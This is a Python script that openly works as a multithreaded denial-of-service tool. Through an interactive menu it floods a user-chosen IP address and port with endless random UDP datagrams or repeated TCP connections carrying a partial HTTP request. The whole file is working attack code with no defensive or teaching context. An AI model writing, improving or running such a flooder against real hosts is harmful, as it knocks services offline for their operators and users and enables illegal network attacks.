import socket
import os
import random
import time
import threading

def udp_attack(target_ip, target_port):
    """Perform a UDP attack on the target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Generate random bytes

    while True:
        try:
            sock.sendto(bytes, (target_ip, target_port))
            print(f"Sending UDP packets to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending UDP packet: {e}")

def tcp_attack(target_ip, target_port):
    """Perform a TCP attack on the target."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
            print(f"Sending TCP packets to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending TCP packet: {e}")
        finally:
            sock.close()

def http_attack(target_ip, target_port):
    """Perform an HTTP attack on the target."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
            print(f"Sending HTTP requests to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending HTTP request: {e}")
        finally:
            sock.close()

def main():
    print("What type of attack would you like to perform?")
    print("1. UDP")
    print("2. TCP/IP")
    print("3. HTTP")

    choice = input("Select an option (1/2/3): ")

    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    num_threads = int(input("Enter number of threads to use: "))

    if choice == '1':
        print("Starting UDP attack...")
        for _ in range(num_threads):
            thread = threading.Thread(target=udp_attack, args=(target_ip, target_port))
            thread.start()
    elif choice == '2':
        print("Starting TCP attack...")
        for _ in range(num_threads):
            thread = threading.Thread(target=tcp_attack, args=(target_ip, target_port))
            thread.start()
    elif choice == '3':
        print("Starting HTTP attack...")
        for _ in range(num_threads):
            thread = threading.Thread(target=http_attack, args=(target_ip, target_port))
            thread.start()
    else:
        print("Invalid option selected.")

if __name__ == "__main__":
    main()
